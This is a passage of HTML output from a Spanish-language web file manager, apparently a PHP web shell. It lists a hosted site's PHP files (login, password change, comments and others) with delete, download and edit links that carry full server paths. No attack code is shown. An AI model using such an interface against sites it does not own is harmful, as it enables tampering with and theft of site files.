                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/comentario-borrar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/comentario-borrar.php::comentario-borrar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::comentario-borrar.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::comentario3.php">comentario3.php</a></td>
                    <td>Archivo</td>
                    <td>2.66 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/comentario3.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/comentario3.php::comentario3.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::comentario3.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::comentarios.php">comentarios.php</a></td>
                    <td>Archivo</td>
                    <td>1.83 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/comentarios.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/comentarios.php::comentarios.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::comentarios.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::conectados.php">conectados.php</a></td>
                    <td>Archivo</td>
                    <td>3.45 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/conectados.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/conectados.php::conectados.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::conectados.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::contacto-form.php">contacto-form.php</a></td>
                    <td>Archivo</td>
                    <td>2.59 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/contacto-form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/contacto-form.php::contacto-form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::contacto-form.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::contacto.php">contacto.php</a></td>
                    <td>Archivo</td>
                    <td>1.24 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/contacto.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/contacto.php::contacto.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::contacto.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::datos_cambiar.php">datos_cambiar.php</a></td>
                    <td>Archivo</td>
                    <td>1.19 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/datos_cambiar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/datos_cambiar.php::datos_cambiar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::datos_cambiar.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::denuncia-form.php">denuncia-form.php</a></td>
                    <td>Archivo</td>
                    <td>2.81 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/denuncia-form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/denuncia-form.php::denuncia-form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::denuncia-form.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::denuncia-publica-form.php">denuncia-publica-form.php</a></td>
                    <td>Archivo</td>
                    <td>7.2 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/denuncia-publica-form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/denuncia-publica-form.php::denuncia-publica-form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::denuncia-publica-form.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::denuncia-publica.php">denuncia-publica.php</a></td>
                    <td>Archivo</td>
                    <td>1.15 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/denuncia-publica.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/denuncia-publica.php::denuncia-publica.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::denuncia-publica.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::denuncia.php">denuncia.php</a></td>
                    <td>Archivo</td>
                    <td>1.12 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/denuncia.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/denuncia.php::denuncia.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::denuncia.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::denuncias.php">denuncias.php</a></td>
                    <td>Archivo</td>
                    <td>6.59 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/denuncias.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/denuncias.php::denuncias.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::denuncias.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::edicion.form.php">edicion.form.php</a></td>
                    <td>Archivo</td>
                    <td>14.57 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/edicion.form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/edicion.form.php::edicion.form.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::edicion.form.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::edicion.php">edicion.php</a></td>
                    <td>Archivo</td>
                    <td>1.67 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/edicion.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/edicion.php::edicion.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::edicion.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::emoticones.php">emoticones.php</a></td>
                    <td>Archivo</td>
                    <td>8.57 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/emoticones.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/emoticones.php::emoticones.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::emoticones.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::enlazanos.php">enlazanos.php</a></td>
                    <td>Archivo</td>
                    <td>2.85 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/enlazanos.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/enlazanos.php::enlazanos.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::enlazanos.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::favoritos-borrar2.php">favoritos-borrar2.php</a></td>
                    <td>Archivo</td>
                    <td>218 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/favoritos-borrar2.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/favoritos-borrar2.php::favoritos-borrar2.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::favoritos-borrar2.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::favoritos.php">favoritos.php</a></td>
                    <td>Archivo</td>
                    <td>4.77 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/favoritos.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/favoritos.php::favoritos.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::favoritos.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::favoritos.post.add.php">favoritos.post.add.php</a></td>
                    <td>Archivo</td>
                    <td>810 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/favoritos.post.add.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/favoritos.post.add.php::favoritos.post.add.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::favoritos.post.add.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::header.php">header.php</a></td>
                    <td>Archivo</td>
                    <td>34.82 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/header.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/header.php::header.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::header.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::home.php">home.php</a></td>
                    <td>Archivo</td>
                    <td>1.22 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/home.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/home.php::home.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::home.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::index.php">index.php</a></td>
                    <td>Archivo</td>
                    <td>15.42 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/index.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/index.php::index.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::index.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::login.php">login.php</a></td>
                    <td>Archivo</td>
                    <td>1.37 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/login.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/login.php::login.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::login.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::mapa-del-sitio.php">mapa-del-sitio.php</a></td>
                    <td>Archivo</td>
                    <td>2 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/mapa-del-sitio.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/mapa-del-sitio.php::mapa-del-sitio.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::mapa-del-sitio.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::miavatar_cambiar.php">miavatar_cambiar.php</a></td>
                    <td>Archivo</td>
                    <td>812 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/miavatar_cambiar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/miavatar_cambiar.php::miavatar_cambiar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::miavatar_cambiar.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::misimagenes.php">misimagenes.php</a></td>
                    <td>Archivo</td>
                    <td>3.33 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/misimagenes.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/misimagenes.php::misimagenes.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::misimagenes.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::misimagenes_cambiar.php">misimagenes_cambiar.php</a></td>
                    <td>Archivo</td>
                    <td>987 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/misimagenes_cambiar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/misimagenes_cambiar.php::misimagenes_cambiar.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::misimagenes_cambiar.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::mod-history.php">mod-history.php</a></td>
                    <td>Archivo</td>
                    <td>1.37 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/mod-history.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/mod-history.php::mod-history.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::mod-history.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::monitor.php">monitor.php</a></td>
                    <td>Archivo</td>
                    <td>6.57 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/monitor.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/monitor.php::monitor.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::monitor.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::next.php">next.php</a></td>
                    <td>Archivo</td>
                    <td>430 B</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/next.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/next.php::next.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::next.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::notificaciones-ajax.php">notificaciones-ajax.php</a></td>
                    <td>Archivo</td>
                    <td>5.63 KB</td>
                    <td><span class="si_permisos">rwxr-x---</span></td>
                    <td class="opciones">
                        <a id="borrar" title="Borrar" href="?borrar_archivo::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/notificaciones-ajax.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::1">Borrar</a>
                        <a id="descargar" title="Descargar" href="?descargar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs/notificaciones-ajax.php::notificaciones-ajax.php::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs">Descargar</a>
                        <a id="editar" title="Editar" href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::notificaciones-ajax.php">Editar</a>
                    </td>
                    </tr><tr valign="top">
                    <td class="archivo"></td>
                    <td><a href="?editar::/home/vol13/byethost15.com/b15_5679103/skynetx.cz.cc/htdocs::password-cambiar.php">password-cambiar.php</a></td>
                    <td>Archivo</td>
                    <td>1.48 KB</td>
